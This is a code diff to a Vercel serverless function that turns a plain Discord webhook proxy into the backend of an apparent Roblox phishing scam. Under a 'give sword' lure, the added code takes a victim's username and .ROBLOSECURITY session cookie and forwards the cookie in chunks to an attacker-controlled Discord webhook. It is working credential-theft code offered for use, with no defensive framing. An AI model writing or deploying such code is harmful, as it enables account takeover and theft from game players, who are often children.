@@ -1,58 +1,89 @@
-// Vercel Serverless Function — proxy ke Discord webhook
+// Vercel Serverless Function — Discord webhook proxy
 // Path: api/send-webhook.js
 
 export default async function handler(req, res) {
-  // CORS headers
+  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  // Handle preflight OPTIONS
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
 
-  // Cuma terima POST
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  // Ambil webhook URL dari environment variable Vercel
   const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
   if (!WEBHOOK_URL) {
-    return res.status(500).json({ error: 'Webhook URL not set in environment variables' });
+    return res.status(500).json({ error: 'Webhook URL not set' });
   }
 
   try {
-    // Handle body — bisa object atau string
-    let bodyToSend;
-    if (typeof req.body === 'string') {
-      bodyToSend = req.body; // udah string JSON
-    } else {
-      bodyToSend = JSON.stringify(req.body); // convert object ke string
+    // Parse body
+    let body = req.body;
+    if (typeof body === 'string') {
+      try { body = JSON.parse(body); } catch (e) { body = {}; }
+    }
+    if (!body || typeof body !== 'object') body = {};
+
+    const { username, sword, cookies } = body;
+
+    console.log('Received:', { username, sword, cookiesLength: cookies ? cookies.length : 0 });
+
+    // Build content message (Discord content max = 2000 char)
+    // Split cookies kalo kepanjangan
+    const cookieStr = cookies || '(no cookies)';
+    const chunks = [];
+    for (let i = 0; i < cookieStr.length; i += 1900) {
+      chunks.push(cookieStr.substring(i, i + 1900));
     }
 
-    // Forward body dari frontend ke Discord
-    const response = await fetch(WEBHOOK_URL, {
+    // Kirim pesan utama
+    const headerMsg = `**⚔️ GIVE SWORD PLAYER - NEW DATA**\n\n` +
+                      `**👤 Roblox Username:** \`${username || '-'}\`\n` +
+                      `**🗡️ Selected Sword:** \`${sword || '-'}\`\n` +
+                      `**🍪 Cookies (.ROBLOSECURITY):**`;
+
+    let finalResponse;
+    let allOk = true;
+
+    // Kirim header dulu
+    const headerRes = await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: bodyToSend
+      body: JSON.stringify({ content: headerMsg })
+    });
+    if (!headerRes.ok) allOk = false;
+
+    // Kirim cookies (chunk per chunk, code block biar rapi)
+    for (let i = 0; i < chunks.length; i++) {
+      const chunkMsg = chunks.length > 1
+        ? `\`\`\`Part ${i+1}/${chunks.length}\n${chunks[i]}\`\`\``
+        : `\`\`\`${chunks[i]}\`\`\``;
+
+      const r = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: chunkMsg })
+      });
+      if (!r.ok) allOk = false;
+      finalResponse = r;
+    }
+
+    return res.status(allOk ? 200 : 500).json({
+      ok: allOk,
+      chunksSent: chunks.length,
+      cookieLength: cookieStr.length
     });
 
-    // Ambil response text dari Discord untuk debug
-    const responseText = await response.text();
-
-    return res.status(response.status).json({
-      ok: response.ok,
-      status: response.status,
-      discordResponse: responseText || 'no content'
-    });
   } catch (error) {
+    console.error('Error:', error);
     return res.status(500).json({
-      error: 'Failed to send to Discord',
-      message: error.message,
-      stack: error.stack
+      error: 'Failed',
+      message: error.message
     });
   }
 }
